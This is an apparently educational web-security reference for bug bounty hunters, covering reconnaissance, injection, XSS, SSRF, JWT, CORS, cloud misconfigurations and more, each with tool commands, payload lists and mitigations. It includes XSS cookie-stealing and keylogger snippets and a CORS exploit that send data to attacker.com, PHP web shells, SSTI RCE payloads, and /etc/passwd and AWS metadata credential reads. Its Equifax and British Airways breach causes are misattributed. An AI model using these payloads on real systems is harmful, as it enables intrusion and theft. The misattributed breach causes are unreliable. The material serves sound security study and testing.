# Complete Web Application Security Guide
## Bug Bounty Hunter & Security Analyst Reference

---

## TABLE OF CONTENTS

1. [Reconnaissance](#1-reconnaissance)
2. [SQL Injection](#2-sql-injection)
3. [Cross-Site Scripting (XSS)](#3-cross-site-scripting-xss)
4. [Command Injection](#4-command-injection)
5. [Server-Side Template Injection (SSTI)](#5-server-side-template-injection-ssti)
6. [SSRF - Server-Side Request Forgery](#6-ssrf---server-side-request-forgery)
7. [IDOR - Insecure Direct Object Reference](#7-idor---insecure-direct-object-reference)
8. [CSRF - Cross-Site Request Forgery](#8-csrf---cross-site-request-forgery)
9. [Authentication Vulnerabilities](#9-authentication-vulnerabilities)
10. [Authorization Flaws](#10-authorization-flaws)
11. [File Upload Vulnerabilities](#11-file-upload-vulnerabilities)
12. [403 Bypass Techniques](#12-403-bypass-techniques)
13. [Security Misconfigurations](#13-security-misconfigurations)
14. [Sensitive Data Exposure](#14-sensitive-data-exposure)
15. [JWT Attacks](#15-jwt-attacks)
16. [CORS Misconfiguration](#16-cors-misconfiguration)
17. [API Security](#17-api-security)
18. [Clickjacking](#18-clickjacking)
19. [Cloud Security (AWS S3, IAM)](#19-cloud-security-aws-s3-iam)
20. [Logging & Monitoring](#20-logging--monitoring)

---

## 1. RECONNAISSANCE

### 1.1 Subdomain Enumeration

#### Simple Explanation
Find all subdomains of a target (e.g., admin.example.com, api.example.com) to expand your attack surface.

#### Real-world Example
During a bug bounty, discovering `staging.example.com` led to finding an exposed `.env` file with AWS credentials.

#### Technical Explanation
- DNS queries for A, AAAA, MX, NS, TXT, CNAME records
- Certificate Transparency logs (crt.sh)
- DNS aggregation services
- Brute force enumeration

#### Manual Testing Method
```bash
# 1. Basic DNS lookup
dig example.com A
dig example.com MX
dig example.com TXT
dig example.com NS

# 2. Zone transfer attempt (rarely works but worth trying)
dig axfr example.com @ns1.example.com

# 3. Certificate Transparency
curl -s "https://crt.sh/?q=example.com&output=json" | jq '.[].name_value'

# 4. crt.sh web interface
# Visit: https://crt.sh/?q=example.com
```

#### Automated Tools (Kali Linux)

```bash
# === Sublist3r ===
python3 sublist3r.py -d example.com -o subdomains.txt

# === Assetfinder ===
assetfinder example.com | tee subdomains.txt

# === Amass ===
amass enum -passive -d example.com -o subdomains.txt
amass enum -active -d example.com -brute -w wordlist.txt

# === FFUF ===
ffuf -w wordlist.txt -u https://FUZZ.example.com -mc 200,301,302,403

# === Gobuster ===
gobuster dns -d example.com -w wordlist.txt -o subdomains_gobuster.txt

# === DNSRecon ===
dnsrecon -d example.com -t std,brt -D wordlist.txt
```

#### Subdomain Wordlist
```bash
# Common subdomains to brute force
www, mail, ftp, admin, webmail, smtp, pop, ns1, webdisk
cpanel, whm, autodiscover, autoconfig, m, imap, test, ns, blog
pop3, dev, www2, admin, forum, news, vpn, mysql, old, lists, support
static, docs, beta, shop, secure, demo, api, cloud, console
dashboard, git, svn, backup, stage, staging, dev, development
jenkins, docker, registry, gitlab, grafana, prometheus, kibana
```

#### Troubleshooting
- If Amass fails: `sudo apt install amass`
- If DNS queries timeout: Try different DNS servers
- If rate limited: Add delays between requests

---

### 1.2 Directory Enumeration

#### Simple Explanation
Find hidden files, directories, and endpoints that shouldn't be publicly accessible.

#### Real-world Example
Discovering `/admin/.htpasswd` or `/backup/database.sql` can lead to full compromise.

#### Technical Explanation
- HTTP response codes (200, 301, 302, 403, 500)
- Content-length differences
- Time-based detection
- Fuzzing with wordlists

#### Automated Tools

```bash
# === Gobuster ===
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt

# === FFUF ===
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://example.com/FUZZ
ffuf -w /usr/share/wordlists/raft-medium-directories.txt -u https://example.com/FUZZ/ -recursion

# === Dirb ===
dirb https://example.com /usr/share/wordlists/dirb/common.txt
dirb https://example.com -o output.txt

# === Nikto ===
nikto -h https://example.com -o nikto_output.txt

# === WFuzz ===
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 https://example.com/FUZZ
```

#### Common Sensitive Endpoints
```
/admin
/admin.php
/admin/login
/administrator
/cpanel
/phpmyadmin
/pma
/.git
/.git/config
/.git/HEAD
/.env
/config.php
/backup
/backups
/database.sql
/dump.sql
/.htaccess
/.htpasswd
/api
/api/v1
/api/v2
/api/swagger
/swagger-ui
/debug
/debugger
/health
/actuator
/info
/phpinfo
/server-status
/.DS_Store
/.aws/credentials
```

---

### 1.3 Parameter Discovery

```bash
# === Arjun ===
python3 arjun.py -u https://example.com/api endpoint --get

# === Param Miner (Burp Suite Extension) ===
# Install from BApp Store

# === FFUF for parameter fuzzing ===
ffuf -w params.txt -u https://example.com/?FUZZ=test -fc 400

# === Kiterunner ===
kr brute https://example.com/api -w /usr/share/wordlists/kiterunner/routes.txt
```

---

## 2. SQL INJECTION

### 2.1 Simple Explanation
Attackers inject malicious SQL code into queries, allowing them to read, modify, or delete database data.

### 2.2 Real-world Example
In 2017, Equifax suffered a data breach affecting 147 million people due to an unpatched SQL injection vulnerability.

### 2.3 Technical Explanation
```sql
-- Vulnerable query (backend)
SELECT * FROM users WHERE id = '$id'

-- Attacker input
' OR '1'='1

-- Resulting query
SELECT * FROM users WHERE id = '' OR '1'='1'
```

### 2.4 Types of SQL Injection

| Type | Description | Example |
|------|-------------|---------|
| In-Band | Data extracted via same channel | UNION-based, Error-based |
| Blind | No direct output | Boolean-based, Time-based |
| Out-of-Band | Data via different channel | DNS exfiltration |

### 2.5 Step-by-Step Manual Testing

```bash
# Step 1: Detect vulnerability
# Add single quote to parameter
https://example.com/product?id=1'

# Step 2: If error occurs, test with boolean
https://example.com/product?id=1' AND '1'='1  # Should return same as id=1
https://example.com/product?id=1' AND '1'='2  # Should return different or empty

# Step 3: Determine database type
' UNION SELECT version()--

# Step 4: Extract data
' UNION SELECT table_name FROM information_schema.tables--
```

### 2.6 Payload List

#### Basic Payloads
```sql
'
''
`
') 
")) 
OR 1=1
OR 1=2
' OR '1'='1
' OR '1'='1'--
' OR '1'='1' #
' OR '1'='1'/*
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
```

#### UNION-Based Payloads
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION ALL SELECT NULL--
' UNION ALL SELECT NULL,NULL--
' UNION ALL SELECT NULL,NULL,NULL--
```

#### Error-Based Payloads
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

#### Time-Based (Blind)
```sql
' AND SLEEP(5)--
' AND BENCHMARK(5000000,MD5('A'))--
' WAITFOR DELAY '00:00:05'--
' OR SLEEP(5)--
```

### 2.7 Bypass Techniques

```sql
-- Case transformation
' oR '1'='1
' UnIoN SeLeCt

-- Whitespace alternatives
'/**/OR/**/'1'='1
'/*!50000OR*/'1'='1
'%09OR%091=1

-- URL encoding
%27%20OR%20%271%27%3D%271

-- Double encoding
%2527%2520OR%2520%25271%2527%253D%25271

-- Hex encoding
' OR 0x31=0x31

-- Char function
' OR CHAR(39)=CHAR(39)
```

### 2.8 SQLMap Commands (Kali Linux)

```bash
# Basic scan
sqlmap -u "https://example.com/product?id=1"

# With POST data
sqlmap -u "https://example.com/login" --data="username=admin&password=test"

# With cookies
sqlmap -u "https://example.com/profile" --cookie="PHPSESSID=abc123"

# Enumerate databases
sqlmap -u "https://example.com/product?id=1" --dbs

# Enumerate tables
sqlmap -u "https://example.com/product?id=1" -D database_name --tables

# Dump data
sqlmap -u "https://example.com/product?id=1" -D database_name -T users --dump

# Shell access
sqlmap -u "https://example.com/product?id=1" --os-shell

# Random user agent
sqlmap -u "https://example.com/product?id=1" --random-agent

# Risk and level
sqlmap -u "https://example.com/product?id=1" --level=5 --risk=3

# Tamper scripts
sqlmap -u "https://example.com/product?id=1" --tamper=space2comment,between
```

### 2.9 Impact
- **Confidentiality**: Full database dump
- **Integrity**: Modify/delete data
- **Authentication Bypass**: Login without password
- **Remote Code Execution**: Sometimes achievable via xp_cmdshell (MSSQL)

### 2.10 Mitigation
```sql
-- SECURE: Using parameterized queries
-- Python example
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

-- Java example
PreparedStatement stmt = connection.prepareStatement(
    "SELECT * FROM users WHERE id = ?"
);
stmt.setInt(1, userId);

-- SECURE: Stored procedures
CREATE PROCEDURE GetUser(@id INT)
AS
BEGIN
    SELECT * FROM users WHERE id = @id
END
```

### 2.11 Sample Vulnerable Code
```php
// VULNERABLE - Direct concatenation
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$result = mysqli_query($conn, $query);

// SECURE - Prepared statement
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();
```

### 2.12 Interview Questions
1. What is the difference between UNION-based and Error-based SQLi?
2. How would you exploit blind SQL injection?
3. What is second-order SQL injection?
4. How do you prevent SQL injection in different languages?

---

## 3. CROSS-SITE SCRIPTING (XSS)

### 3.1 Simple Explanation
Attackers inject malicious JavaScript into web pages that execute in victims' browsers.

### 3.2 Real-world Example
2018: British Airways suffered a breach affecting 380,000 payment cards due to XSS in their booking system.

### 3.3 Types of XSS

| Type | Description | Occurs When |
|------|-------------|-------------|
| Reflected | Payload in request, reflected in response | URL parameters |
| Stored | Payload stored on server | Database, comments |
| DOM-based | Payload processed in client-side JS | JavaScript parsing |

### 3.4 Step-by-Step Manual Testing

```bash
# Step 1: Basic reflection test
https://example.com/search?q=<script>alert(1)</script>

# Step 2: Check if script executes
# If you see alert popup, XSS is confirmed

# Step 3: Test event handlers
https://example.com/search?q=<img src=x onerror=alert(1)>
https://example.com/search?q=<svg onload=alert(1)>

# Step 4: Test stored XSS
# Submit payload in forms, comments, registration
```

### 3.5 Payload List

#### Basic Payloads
```html
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<embed src="javascript:alert(1)">
<input onfocus=alert(1) autofocus>
```

#### Polyglot Payloads
```html
jaVasCript:/*-<![CDATA[*/alert(1)//*/;/*-->*/</script>
<svg/onload=alert(1)>
'"><script>alert(1)</script>
</title><script>alert(1)</script>
```

#### Event Handler Payloads
```html
<body onload=alert(1)>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<marquee onstart=alert(1)>
```

### 3.6 Bypass Techniques

```html
<!-- Case transformation -->
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</sCrIpT>

<!-- HTML encoding -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- URL encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Null bytes -->
<script>alert(1)%00</script>

<!-- Unicode normalization -->
<script>\u0061lert(1)</script>

<!-- Remove script tags bypass -->
<img src=x onerror=alert(1)>
```

### 3.7 Automated Tools

```bash
# === XSStrike ===
python3 xsstrike.py -u "https://example.com/search?q=test"

# === Dalfox ===
dalfox url "https://example.com/?q=test"

# === Nuclei Templates ===
nuclei -t xss/ -u https://example.com

# === Burp Suite ===
# Use Intruder with XSS payloads
# Use DOM Invader for DOM-based XSS
```

### 3.8 XSS to Account Takeover

```javascript
// Steal cookies
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

// Keylogger
<script>document.onkeypress=function(e){new Image().src='https://attacker.com/log?k='+e.key}</script>

// Session hijacking
<script>
fetch('https://attacker.com', {
  method: 'POST',
  body: JSON.stringify({
    cookie: document.cookie,
    localStorage: localStorage,
    sessionStorage: sessionStorage
  })
})
</script>

// Redirect to phishing
<script>window.location='https://attacker.com/fake-login?next='+window.location.href</script>
```

### 3.9 Impact
- **Session Hijacking**: Steal cookies/session tokens
- **Credential Theft**: Auto-fill forms with malicious JavaScript
- **Defacement**: Modify page content
- **Malware Distribution**: Inject malicious scripts
- **Keylogging**: Capture user input

### 3.10 Mitigation

```html
<!-- SECURE: Output encoding -->
<!-- In template -->
<div>{{ userInput | escape }}</div>

<!-- In JavaScript -->
const safe = DOMPurify.sanitize(userInput);

// SECURE: Content Security Policy -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">

<!-- SECURE: HTTPOnly cookies -->
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

### 3.11 Interview Questions
1. What's the difference between DOM-based and reflected XSS?
2. How would you escalate an XSS finding?
3. What is mutation XSS?
4. How does CSP help prevent XSS?

---

## 4. COMMAND INJECTION

### 4.1 Simple Explanation
Attackers execute system commands on the server through vulnerable application inputs.

### 4.2 Real-world Example
2019: Multiple IoT cameras had command injection via ping parameter, allowing full device takeover.

### 4.3 Step-by-Step Testing

```bash
# Basic test - does command execute?
| whoami
; whoami
&& whoami
`whoami`
$(whoami)

# If output appears, command injection confirmed
```

### 4.4 Payload List

```bash
# Linux
; ls
| ls
& ls
&& ls
`ls`
$(ls)
/bin/ls
whoami
id
cat /etc/passwd
; pwd
| hostname
; uname -a

# Windows
; dir
& dir
&& dir
| type C:\Windows\win.ini
; ipconfig
& ipconfig
```

### 4.5 Bypass Techniques

```bash
# Space bypass
${IFS}ls
{ls}
<ls>
$(ls)

# Encoding
echo%20test
echo$IFStest

# Variable interpolation
a=whoami; $a
```

### 4.6 Tools

```bash
# === Commix (Kali Linux) ===
commix -u "https://example.com/ping?ip=127.0.0.1"

# === Manual testing ===
curl "https://example.com/ping?ip=127.0.0.1;ls"
```

### 4.7 Impact
- **Full System Compromise**: Execute any command
- **Data Exfiltration**: Read sensitive files
- **Lateral Movement**: Pivot to other systems
- **Persistence**: Install backdoors

### 4.8 Mitigation

```python
# VULNERABLE
import subprocess
cmd = "ping -c 1 " + user_input
subprocess.call(cmd, shell=True)

# SECURE
import subprocess
cmd = ["ping", "-c", "1", user_input]  # No shell=True
subprocess.run(cmd)
```

---

## 5. SERVER-SIDE TEMPLATE INJECTION (SSTI)

### 5.1 Simple Explanation
Attackers inject template expressions that get executed on the server.

### 5.2 Real-world Example
Uber's bug bounty: SSTI in Python/Jinja2 led to remote code execution.

### 5.3 Testing Payloads

```bash
# Test for SSTI
{{7*7}}
${7*7}
<%= 7*7 %>

# If output shows 49, SSTI confirmed

# Jinja2 - Read config
{{ config.items() }}

# Jinja2 - Read file
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}

# Twig - RCE
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}

# Freemarker - RCE
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
```

### 5.4 Impact
- **Remote Code Execution**
- **Server Compromise**
- **Data Theft**

### 5.5 Mitigation

```python
# Jinja2 - Sandbox environment
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()

# Never allow user input in template rendering
# Use template engines with auto-escaping
```

---

## 6. SSRF - SERVER-SIDE REQUEST FORGERY

### 6.1 Simple Explanation
Attackers make the server perform requests to internal or external resources.

### 6.2 Real-world Example
2019: Capital One breach - SSRF in AWS allowed access to metadata service, exposing data of 100 million customers.

### 6.3 Testing Payloads

```bash
# Localhost
http://localhost
http://127.0.0.1
http://[::1]

# Internal networks
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1

# Cloud metadata
http://169.254.169.254
http://metadata.google.internal

# File access
file:///etc/passwd
dict://127.0.0.1:11211/stats
sftp://attacker.com:22/
```

### 6.4 AWS Metadata Endpoints

```bash
# EC2 Metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# Response
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 6.5 Bypass Techniques

```bash
# IP encoding
127.0.0.1 -> 2130706433 (decimal)
127.0.0.1 -> 0x7f000001 (hex)
localhost -> 2130706433

# DNS rebinding
attacker.com -> 127.0.0.1 (via DNS)

# URL parsing bypass
http://127.0.0.1@attacker.com
http://attacker.com#127.0.0.1
http://attacker.com\.127.0.0.1
```

### 6.6 Impact
- **Access Internal Services**
- **Cloud Metadata Exposure**
- **Port Scanning Internal Network**
- **Data Exfiltration**

### 6.7 Mitigation

```python
# SECURE: URL validation
from urllib.parse import urlparse

def validate_url(url):
    parsed = urlparse(url)
    
    # Block private IPs
    if parsed.hostname in ['localhost', '127.0.0.1']:
        raise ValidationError("Invalid URL")
    
    # Block internal ranges
    if parsed.hostname in private_ips:
        raise ValidationError("Invalid URL")
    
    # Allow only whitelisted domains
    if parsed.hostname not in allowed_domains:
        raise ValidationError("Invalid URL")
```

---

## 7. IDOR - INSECURE DIRECT OBJECT REFERENCE

### 7.1 Simple Explanation
Changing an ID parameter to access other users' data without authorization.

### 7.2 Real-world Example
Changing `?id=123` to `?id=124` in a banking app to view another user's account.

### 7.3 Testing Method

```bash
# 1. Login as user A
# 2. Perform action (view profile, order, etc.)
# 3. Note the ID parameter
https://app.com/profile?id=1001

# 4. Change ID
https://app.com/profile?id=1002

# 5. If you see user 1002's data, IDOR confirmed
```

### 7.4 Tools

```bash
# === Burp Suite ===
# 1. Enable "Intercept"
# 2. Change ID parameter
# 3. Compare responses

# === Autorize (Burp Extension) ===
# Automates authorization testing
```

### 7.5 Impact
- **Unauthorized Data Access**
- **Account Takeover**
- **Privilege Escalation**

### 7.6 Mitigation

```python
# VULNERABLE
@app.route('/profile')
def profile():
    user_id = request.args.get('id')
    return db.get_user(user_id)  # No authorization check

# SECURE
@app.route('/profile')
@login_required
def profile():
    user_id = request.args.get('id')
    
    # Authorization check
    if current_user.id != int(user_id) and not current_user.is_admin:
        abort(403)
    
    return db.get_user(user_id)
```

---

## 8. CSRF - CROSS-SITE REQUEST FORGERY

### 8.1 Simple Explanation
Forcing users to perform unintended actions on web applications where they're authenticated.

### 8.2 Real-world Example
2019: Burger King bug bounty allowed changing passwords via CSRF.

### 8.3 Testing Method

```html
<!-- Create malicious page -->
<html>
<body>
  <form action="https://app.com/change-email" method="POST" id="csrf">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

### 8.4 Mitigation

```html
<!-- Generate CSRF token -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="abc123xyz" />
  <!-- other fields -->
</form>

<!-- Verify token on server -->
if (session.csrf_token != request.form['csrf_token']):
    abort(403)
```

---

## 9. AUTHENTICATION VULNERABILITIES

### 9.1 Common Issues

| Vulnerability | Description | Test Method |
|--------------|-------------|-------------|
| Weak Password | No complexity requirements | Try common passwords |
| No Brute Force Protection | No rate limiting | Multiple failed logins |
| Password Reset Flaws | Token prediction/exposure | Test reset flow |
| Session Fixation | Session ID not regenerated | Fix session before login |
| Default Credentials | Admin:admin still active | Check documentation |

### 9.2 Testing Password Reset

```bash
# 1. Request reset for your email
# 2. Analyze reset link
#    - Is token guessable?
#    - Does it expire?
#    - Is it sent via HTTP?

# 3. Test token reuse
#    - Use same token twice

# 4. Test account takeover
#    - Request reset for victim
#    - Intercept token
#    - Change email to attacker
```

### 9.3 Tools

```bash
# === Hydra (Brute Force) ===
hydra -l admin -P passwords.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# === Medusa ===
medusa -h example.com -u admin -P passwords.txt -M http -m "/login:username=^USER^&password=^PASS^"

# === Burp Suite Intruder ===
# Use pitchfork with usernames and passwords
```

---

## 10. AUTHORIZATION FLAWS

### 10.1 Vertical Privilege Escalation
Regular user gaining admin privileges.

```bash
# Test admin endpoints with user session
GET /admin/dashboard
GET /api/v1/admin/users
POST /api/v1/admin/settings
```

### 10.2 Horizontal Privilege Escalation
User accessing another user's resources.

```bash
# User A accessing User B's data
GET /api/users/123/profile  # User A
GET /api/users/456/profile  # User B's data
```

### 10.3 Testing Method

```bash
# 1. Map all endpoints (admin, user, api)
# 2. Identify role-based access
# 3. Test each endpoint with different roles
# 4. Check for IDOR in parameter names
```

---

## 11. FILE UPLOAD VULNERABILITIES

### 11.1 Simple Explanation
Uploading malicious files (especially web shells) to gain server access.

### 11.2 Payloads

```php
<!-- Simple PHP Shell -->
<?php system($_GET['cmd']); ?>

<!-- Web Shell -->
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>".shell_exec($_GET['cmd'])."</pre>";
}
?>

<!-- Image with PHP code -->
# Create: image.jpg with <?php system($_GET['cmd']); ?> appended
```

### 11.3 Bypass Techniques

```bash
# MIME type bypass
Content-Type: image/jpeg

# Extension bypass
shell.php.jpg
shell.php5
shell.phtml
shell.shtml

# Null byte
shell.php%00.jpg

# Double extension
shell.jpg.php

# Case manipulation
shell.PhP
shell.PHP
```

### 11.4 Mitigation

```python
# SECURE: Validate uploaded files
import os
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def upload_file(file):
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        # Store outside web root
        filepath = os.path.join('/secure/uploads', filename)
        file.save(filepath)
        return filepath
    return None
```

---

## 12. 403 BYPASS TECHNIQUES

### 12.1 Why 403 Bypasses Matter
Administrators often rely on 403 errors to protect sensitive endpoints, but bypasses can expose admin panels, APIs, or internal resources.

### 12.2 HTTP Method Manipulation

```bash
# Change GET to POST, PUT, DELETE, PATCH
GET /admin HTTP/1.1
POST /admin HTTP/1.1
OPTIONS /admin HTTP/1.1
HEAD /admin HTTP/1.1
```

### 12.3 Header Manipulation

```bash
# Add/change headers
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-HTTP-Method-Override: GET
Forwarded: for=127.0.0.1
Forwarded: host=localhost
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Host: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
Referer: /admin
Origin: https://example.com
```

### 12.4 Path Manipulation

```bash
# Trailing slash
/admin/
/admin//

# Double encoding
/%2e%2e/admin
/%2e%2e%2fadmin

# Unicode bypass
/..%c0%afadmin
/..%252fadmin
/..%5cadmin

# IP format
http://127.0.0.1/admin
http://2130706433/admin
http://0x7f000001/admin
localhost/admin
```

### 12.5 Automated Tools

```bash
# === ffuf ===
ffuf -w wordlist.txt -u https://example.com/FUZZ/admin -H "X-Original-URL: /admin"
ffuf -w wordlist.txt -u https://example.com/admin -X POST

# === Burp Suite ===
# Use "Autorize" extension
# Test all headers with common bypasses
```

---

## 13. SECURITY MISCONFIGURATIONS

### 13.1 Common Issues

| Issue | Description | Impact |
|-------|-------------|--------|
| Debug Mode Enabled | Debug=true in production | Information disclosure |
| Default Credentials | Admin:admin still active | Full access |
| Directory Listing | Indexes on | Sensitive file exposure |
| Missing Security Headers | No CSP, HSTS, etc. | XSS, MITM |
| Error Messages | Detailed errors | Information disclosure |
| Unnecessary Features | Enabled but unused | Larger attack surface |

### 13.2 Testing with Nmap

```bash
# Detect debug mode
nmap --script http-enum -p 80,443 example.com

# Check security headers
nmap --script http-headers -p 80,443 example.com

# Detect SSL issues
nmap --script ssl-enum-ciphers -p 443 example.com

# Check for default pages
nmap --script http-default-accounts example.com
```

### 13.3 Burp Suite Audit

```bash
# Use "Audit Check" for security misconfigurations
# Check:
# - Missing headers
# - Directory listing
# - Debug endpoints
# - Information disclosure
```

---

## 14. SENSITIVE DATA EXPOSURE

### 14.1 Common Exposure Points

```
/.git/config
/.env
/config.php
/backup.sql
/database.sql
/.DS_Store
/.htaccess
/.htpasswd
/phpinfo.php
/debug.php
/admin/logs
```

### 14.2 Testing Method

```bash
# Git exposure
curl https://example.com/.git/config
git clone https://example.com/.git

# Environment file
curl https://example.com/.env

# Directory listing
curl https://example.com/backups/
```

### 14.3 Cloud Storage

```bash
# AWS S3
aws s3 ls s3://example-bucket/
aws s3 ls s3://example-bucket --region us-east-1

# Open bucket test
aws s3 cp test.txt s3://example-bucket/
curl https://example-bucket.s3.amazonaws.com/
```

---

## 15. JWT ATTACKS

### 15.1 Simple Explanation
Attacking JSON Web Token implementation to bypass authentication.

### 15.2 JWT Structure
```
header.payload.signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
```

### 15.3 Attack Techniques

```bash
# 1. None Algorithm
# Change alg to "none" and remove signature
{"alg":"none","typ":"JWT"}.{"user":"admin"}. 

# 2. Algorithm Confusion
# Change HS256 to RS256
{"alg":"HS256"...} -> {"alg":"RS256"...}

# 3. Key Confusion (if public key available)
# Use RS256 public key with HS256

# 4. Weak secret brute force
python3 jwt_tool.py <jwt_token> -C -d passwords.txt
```

### 15.4 Tools

```bash
# === jwt_tool ===
python3 jwt_tool.py https://example.com/api -c "id=1"

# === Burp Extension: JSON Web Token ===
# Automatically test JWT vulnerabilities

# === John the Ripper ===
john --wordlist=passwords.txt --format=HMAC-SHA256 jwt.txt
```

### 15.5 Mitigations

```javascript
// SECURE: Proper JWT validation
const jwt = require('jsonwebtoken');

function verifyToken(token) {
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET, {
      algorithms: ['HS256'],  // Specify algorithm
      issuer: 'your-app',     // Validate issuer
      audience: 'your-api'    // Validate audience
    });
    return decoded;
  } catch (err) {
    return null;
  }
}
```

---

## 16. CORS MISCONFIGURATION

### 16.1 Simple Explanation
Improperly configured CORS allowing cross-origin access to sensitive data.

### 16.2 Testing Method

```bash
# Check CORS headers
curl -I -H "Origin: https://evil.com" https://example.com/api

# Look for:
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true
```

### 16.3 Exploit

```javascript
// malicious.html
<!DOCTYPE html>
<html>
<body>
<center>
<h1>CORS Exploit</h1>
<p id="output"></p>
</center>
<script>
fetch('https://vulnerable.com/api/user-data', {
  credentials: 'include'
})
.then(r => r.text())
.then(data => {
  fetch('https://attacker.com/steal?data=' + encodeURIComponent(data));
})
</script>
</body>
</html>
```

### 16.4 Dangerous Configurations

```
# VULNERABLE - Any origin with credentials
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

# VULNERABLE - Null origin
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# VULNERABLE - Wildcard subdomain
Access-Control-Allow-Origin: *.example.com
Access-Control-Allow-Credentials: true
```

---

## 17. API SECURITY

### 17.1 Common API Vulnerabilities

| Issue | Description | Test Method |
|-------|-------------|-------------|
| Mass Assignment | Binding user input to model | Add unexpected parameters |
| BOLA | IDOR in API context | Change resource IDs |
| Broken Authentication | Weak API auth | Test auth endpoints |
| Rate Limiting | No brute force protection | Send many requests |
| GraphQL Issues | Introspection, depth limit | Query introspection |

### 17.2 GraphQL Testing

```bash
# Introspection query
POST /graphql
{
  "__schema": {
    "queryType": { "fields": [{ "name": "user", "args": [] }] }
  }
}

# Depth limit bypass
{ data { users { friends { friends { friends { name } } } } } }

# Field suggestions
{ __type(name: "User") { fields { name } } }
```

### 17.3 REST API Testing

```bash
# Change HTTP methods
GET -> POST -> PUT -> DELETE

# Bypass auth
/admin/api -> /api/admin
/api/v1 -> /api/v2

# Pagination abuse
?page=1&limit=10000
```

---

## 18. CLICKJACKING

### 18.1 Simple Explanation
Invisible iframe overlaid on legitimate page to trick users into clicking unintended elements.

### 18.2 Testing Method

```bash
# Create test page
<!DOCTYPE html>
<html>
<head><title>Clickjacking Test</title></head>
<body>
<iframe src="https://target.com" width="100%" height="600px"></iframe>
</body>
</html>
```

### 18.3 Mitigation

```apache
# Apache - Set X-Frame-Options
Header always set X-Frame-Options "DENY"

# Nginx
add_header X-Frame-Options "DENY" always;

# Meta tag
<meta http-equiv="X-Frame-Options" content="DENY">

# CSP
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none'">
```

---

## 19. CLOUD SECURITY (AWS S3, IAM)

### 19.1 S3 Misconfigurations

```bash
# List buckets
aws s3 ls

# Check bucket permissions
aws s3api get-bucket-acl --bucket bucket-name

# Check policy
aws s3api get-bucket-policy --bucket bucket-name

# Try to access
aws s3 ls s3://bucket-name/

# Common permissions
# AllUsers (public)
# AuthenticatedUsers
```

### 19.2 IAM Misconfigurations

```bash
# Get current user
aws sts get-caller-identity

# List users
aws iam list-users

# List policies
aws iam list-policies

# Check attached policies
aws iam list-attached-user-policies --user-name username

# Check inline policies
aws iam list-user-policies --user-name username
```

### 19.3 AWS Account Takeover Scenarios

```bash
# Via password reset
# 1. Takeover email
# 2. Request password reset
# 3. Reset AWS console password

# Via exposed credentials
# 1. Find AWS keys in .env, config files
# 2. Use keys to enumerate
aws configure
aws sts get-caller-identity
```

### 19.4 Tools

```bash
# === Pacu (AWS Exploitation Framework) ===
git clone https://github.com/RhinoSecurityLabs/pacu
python3 pacu.py

# === ScoutSuite ===
scout s3

# === AWS CLI Commands ===
aws configure
aws help
```

---

## 20. LOGGING & MONITORING

### 20.1 What Should Be Logged

```
Authentication Events
- Login attempts (success/failure)
- Password changes
- Account lockouts

Authorization Events  
